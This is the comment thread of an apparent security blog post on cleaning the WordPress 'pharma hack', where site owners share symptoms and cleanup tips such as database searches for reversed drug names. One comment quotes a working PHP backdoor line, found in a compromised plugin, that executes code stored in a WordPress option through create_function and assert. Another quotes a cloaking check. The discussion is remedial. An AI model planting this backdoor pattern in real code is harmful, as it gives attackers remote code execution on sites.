	<li class="comment even thread-even depth-1" id="comment-5205">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo avatar-default' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://twitter.com/MikeLovesBeer" class="comment-author-link" rel="external nofollow" itemprop="url">MikeLovesBeer</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2011-12-21T18:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5205">December 21, 2011</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks, this helped a good amount.  I found an offending file but I&#8217;m not finding anything in the database table that seems to match.  Any ideas?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5213">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/d3f20b33ae76dd3e303a067fae4a3907?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d3f20b33ae76dd3e303a067fae4a3907?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://JoelGoldstein.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Joel Goldstein</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-01-02T18:54:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5213">January 2, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thank so much</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-5223">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ab88a2e8e999490635688e9a3d1b9f81?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ab88a2e8e999490635688e9a3d1b9f81?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">TJ</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-01-11T23:45:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5223">January 11, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Does anyone know if this hack installs a php file browser and exploit tool? I have sites with this &#8220;pharma hack&#8221; but there is also this tool that allowed the hacker to browse files, edit, delete and telnet as apache&#8230; Very bad stuff. The exploits look similar (but not identical) to what&#8217;s posted here. And we have the same results with the SEO spam.</p>
<p>Thanks.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5226">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b6320d4b6032383a6544f2f982495ace?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b6320d4b6032383a6544f2f982495ace?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">edd hillier</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-01-12T22:45:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5226">January 12, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>hi there, i have a variant of this hack the &#8216;free online streaming porn&#8217; which is taking wordpress by storm, but i can&#8217;t find any references to it online in terms of removal, i&#8217;ve been through all the &#8216;pharma&#8217; steps but have found no traces, google and yourselves report no malware, yet a google search reveals masses of posts with the prefix as above.. any ideas?</p>
<p>my security advisor says it&#8217;s a WordPress issue and refuses to persue it..<br />
i&#8217;ve found a rather sus looking file in the site root called ss_744285_j3Wu_remove.php, now it appears to be a css rewriter but it does contain some references to the base64 decode, any<br />
clues anyone?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-5864">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df68c3d4eec82336ff2c13f3ea70ab30?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df68c3d4eec82336ff2c13f3ea70ab30?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Steve Struemph</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-12-14T19:57:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5864">December 14, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I am troubleshooting a WordPress website that has been a victim of the Pharma Hack several times. I am coming in to this late in that others have worked on cleaning this up before me, and I don&#8217;t know what all they did. But the website owner tells me that it was fixed at one time and that the hack came back. I have looked for suspicious files in the plugins folders and suspicious database entries and nothing turned up there (at least nothing obvious). I did find and delete a file in the wp-uploads folder that was named _wp-cache.php. When I ran the website through Sucuri it returned with all green check marks. When I fetch the page as Google using Webmaster Tools it returns a screenshot with viagra and cialis links and text between the content and header. I am a newbie with Webmaster tools so I might not be using it correctly&#8230; My question is, could the website make it though the Sucuri scanner but still be infected? I also wonder if moving this website to a clean install of WordPress would work&#8230; Would backing up and importing into a fresh database still possibly create a database with the hack still infected? Also, I assume the plugins would need to be installed from scratch and not just downloaded and uploaded to a new WP install for the same reason. Any advice would be much appreciated as this has me scratching my head.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5869">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1cf9e986236c8c48155bf133c74792cb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1cf9e986236c8c48155bf133c74792cb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://tom-mcgee.com/blog" class="comment-author-link" rel="external nofollow" itemprop="url">tm_in_nj</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-12-15T21:52:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5869">December 15, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Read all your .htaccess files, all the way up the file system as your host allows, even up to the root level. Pull up your site in an FTP client, and sort by date so you see newest on top. Then go through your uploads directories one at a time and look for any file that seems like it shouldn&#8217;t be there (your folder for January 2010 for example should have files with a timestamp in that month). Malicious code can be in an image file, so make sure they have permissions set to 644 (no execute rights).</p>
<p>If you&#8217;re running any other WordPress or parallel file structures on the server, inspect all the directories in those as well. Malicious files that can mess up your WordPress installation don&#8217;t have to be in that directory to do their work.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-5940">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/265150b21cb471f3f4bb1e8d68c0e5bd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/265150b21cb471f3f4bb1e8d68c0e5bd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Manoel Ramon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-02-07T02:04:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-5940">February 7, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi Guys.. My blog was attacked too but I took a long time to notice and I do not have a database of 2 months ago&#8230; I am trying to clean but looks like this pharma hack got a variation and is spread in different spots mentioned here&#8230;. if you have new info please share.. I am trying to clean by myself but it is not easy.. I already waste hours and hours and no result until now.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1257">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/af9022850dbdb96572ddc2512143df72?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/af9022850dbdb96572ddc2512143df72?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Maggie</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-03-10T18:17:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1257">March 10, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Mine was in wp-options in the options_value key</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1258">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8aa856b67b80a6eee02b5a2beb53ebaa?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8aa856b67b80a6eee02b5a2beb53ebaa?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">performance based seo services</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-03-11T08:40:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1258">March 11, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I really appreciate your effort towards this field which<br />
provides all useful information regarding the topic&#8230;Great job.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1259">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.robbiegod.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Robbiegod</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-05-03T17:11:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1259">May 3, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I would say, you should probably try to do a fresh install of wordpress.  That will at least remove any backdoors that might be in the wordpress core files themselves.  You should backup your database and then open the backup in a text editor and do some searches for terms that you see in the ads. In my wordpress website i found several &#8220;divs&#8221; with a style display none param in them. Inside the div is where pharma keywords were buried text.  I had approx&#8217;ly 52 instances that i had to remove.  I am still fighting it.  I did installed WP Security Scan and Wordfence.  Wordfence will help find opening because it can compare your wordpress core files to the actual wordpress files and tell you what is different.  I&#8217;m confused about how googel webmaster tools works as well. Prior to fixing my website, i scanned a url with fetch as googlebot. I saw the pharma ads in the page.  Now I&#8217;ve cleaned that website and I&#8217;ve tried to refetch the same url.  I still see the pharma ads in my page from fetch as googlebot.  So, what i am wondering is if maybe google has now cached that page.  I&#8217;ve fetched other possibly infected pages and i don&#8217;t see the pharma ads in them anymore.  So i think i got it.  I&#8217;m going to submit the site to have it scanned by google.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1260">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.robbiegod.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Robbiegod</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-05-03T17:17:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1260">May 3, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>First download all of your files via FTP.  Store those files on your local computer somewhere as that is your backup.  Next go into FTP and delete your whole website.  Download wordpress fresh and upload a freshly extracted version of wordpress to your server.  Update the wp-config file with your db info. Upload your theme. Upload any images that are in the uploads folder.  Scan the uploads folder for any .php files.  That&#8217;s what he means.  Its a fresh install of wordpress from the very beginning.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1261">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f460219d8ed3151563c690266973a317?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.robbiegod.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Robbiegod</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-05-03T17:24:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1261">May 3, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>What i do is i delete any theme that i am not actively using.  I usually just have 1 theme per website.  This helps locate infections.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1262">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/66bce29cae050a5ead2b7a81c6106a10?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/66bce29cae050a5ead2b7a81c6106a10?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Brett</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-07-04T16:22:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1262">July 4, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I have the paid sucuri.  My scans all run fine but I&#8217;m 99%sure I have the pharma </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1263">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a748623a3cdb719febdef919fb90597f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a748623a3cdb719febdef919fb90597f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">LukeMarchie</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-07-16T10:14:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1263">July 16, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I just had the pleasure of removing a Pharma Hack like this from a client&#8217;s wordpress installation.  The malicious links were indeed listed as an entry within my wordpress database &#8211; but not in any of the forms you had listed above.  In this case the DB entry was &#8220;_answer_q&#8221;.</p>
<p>I found it by querying my database for instances of &#8220;Levitra/Cialis/etc&#8221; spelled BACKWARDS and ended up finding the bad DB entry.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-1264">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a748623a3cdb719febdef919fb90597f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a748623a3cdb719febdef919fb90597f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">LukeMarchie</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-07-16T10:15:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1264">July 16, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi Mike, </p>
<p>I had a similar issue &#8211; try querying your DB for instances of Levitra/Cialis/etc spelled backwards.</p>
<p>I found the offending DB entry by searching for &#8220;argaiv&#8221; within my wp_options table.  The option name was &#8220;_answered_q&#8221;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-1265">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/0124d4b7d3c9239bf9aa566ec37a0330?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/0124d4b7d3c9239bf9aa566ec37a0330?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">revrell</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-08-09T01:08:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1265">August 9, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Great article I searched for the spam word viagra (backwards &#8220;argaiv&#8221;) and all of the spam code was here: _propertyfeed_w &#8212; My Securi scans are coming back clean, hopefully I did the other steps correctly</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-1266">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e12475d4de50ecda0d12426c2df51dcc?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e12475d4de50ecda0d12426c2df51dcc?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">locaincb</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-09-23T00:04:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1266">September 23, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>THANK YOU &#8211; I have been reading, searching, looking, freaking out for hours &#8211; and I just did a search in my db for &#8216;argaiv&#8217; and I found it! &#8211; I also found &#8216;fwp&#8217;  &#8211; I recommend just search the entire db &#8211; or at least the entire options table as I did not find any of this under the option_name value either.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-1267">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8010fb7dfe581ba9989063c50d86335c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8010fb7dfe581ba9989063c50d86335c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Zac Stevens</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2013-10-21T23:38:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1267">October 21, 2013</a></time></p>		</header>

		<div class="comment-content">
			
			<p>David,</p>
<p>I am not familiar with coding etc. and have been hit by this phara hack. Do you know anyone i can hire to remove the hack and clean my site?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-1269">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a1b2bfbff5889219d84f34c1aae406cb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a1b2bfbff5889219d84f34c1aae406cb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://trona-ca.com" class="comment-author-link" rel="external nofollow" itemprop="url">David Stevens</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-03-14T15:53:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1269">March 14, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>WTF! There us a problem with the editor guys.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-1270">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ac9db2de8ff73b8cff0a1b0cecfc9139?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ac9db2de8ff73b8cff0a1b0cecfc9139?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.intoxicology.net" class="comment-author-link" rel="external nofollow" itemprop="url">Intoxicology 101</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-07-06T15:27:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1270">July 6, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Help please, I&#8217;ve had this Pharma hack Happen to me and I just noticed it after signifcant drop in traffic. I don;t fully have the knowledge to fix this and have become frustrated trying to navigate files I just don&#8217;t regularly deal with. I don&#8217;t want to delete the wrong thing, or ruin anything after running my blog successfully since 2010. I went from about 80K visitors a month, now down to 20K.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-1271">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/97861a925ccaaa9492168f03016d4b52?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/97861a925ccaaa9492168f03016d4b52?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ThankYou</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2014-12-24T04:39:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-1271">December 24, 2014</a></time></p>		</header>

		<div class="comment-content">
			
			<p>After troubleshooting this issue, learned it had to do with a vulnerability with the theme I was using. The functions.php file in each theme folder was bad (some strange long string had been added at the beginning) and there were unknown php files scattered throughout the folders. If you think this is your issue, contact your ISP support to identify the files and replace functions.php file with the original (clean) ones you first downloaded. Hope this helps</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6558">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Vernon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-07-02T13:57:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-6558">July 2, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I found my hack in wp_options &gt; page_infos</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-6559">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Vernon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-07-02T15:39:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-6559">July 2, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I also found the plugin that was compromised: jquery-updater version 2.0.3</p>
<p>The hack code was in the jquery-updater.php file. Here is the line that I was causing the issue:</p>
<p>add_action(&#8216;init&#8217;, create_function(&#8221;, &#8220;@assert(implode(&#8221;, unserialize(get_option(&#8216;default_titles&#8217;))));&#8221;));</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-3" id="comment-6561">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/31dda5bb0aacfd5fc3f29f0aede15350?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Vernon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-07-02T17:03:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-6561">July 2, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I also found this in my template file:<br />
if(ourUrlAndReferer()) the_content(); else if(have_posts()){</p>
<p>There was a check for a hack function added to the loop.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7626">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/56b5b174d5685720aeb7268917e85960?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/56b5b174d5685720aeb7268917e85960?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Leonard T</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-05-13T20:20:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-7626">May 13, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Can someone please tell me how long it took for search engines to begin finding your site again?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7830">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8adf24cd7e0d138f2c5510b4d41d0f05?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8adf24cd7e0d138f2c5510b4d41d0f05?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.olshoppers.com/" class="comment-author-link" rel="external nofollow" itemprop="url">olshoppers.com</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-08-18T22:53:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-7830">August 18, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>pharma hack. Wordfence free version spotted five files with bad code- and showed the code, and securi noted the same files were changed. </p>
<p>the files are in the wp-includes<br />
directory</p>
<p>However, nothing about the database. </p>
<p>The files cannot be removed without<br />
bringing down the site.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-8133">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/794492e146808137dd6a544d9d04d5eb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/794492e146808137dd6a544d9d04d5eb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="https://huntingfrog.com/best-night-vision-scope-reviews/" class="comment-author-link" rel="external nofollow" itemprop="url">Aleena</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2017-12-28T04:54:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html#comment-8133">December 28, 2017</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks man! I searched for Backdoor Inside One of the Plugins and you shared detailed!</p>
<p>Thanks</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-8134">
	<article >

		
